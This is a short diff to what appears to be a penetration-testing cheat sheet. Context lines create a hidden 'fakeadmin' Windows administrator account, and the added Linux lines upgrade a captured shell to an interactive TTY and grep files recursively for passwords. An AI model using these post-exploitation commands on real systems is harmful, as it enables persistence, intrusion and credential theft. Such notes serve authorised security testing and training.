@@ -325,3 +325,14 @@ $UserAccount = Get-LocalUser -Name "fakeadmin"
 $UserAccount | Set-LocalUser -Password $credential
 Add-LocalGroupMember -Group "Administrators" -Member "fakeadmin"
 ```
+
+### Linux
+
+```
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+grep -i password -r -s -h * | cut -c -150
+```
+With magic: https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/
+```
+stty raw -echo ; fg
+```
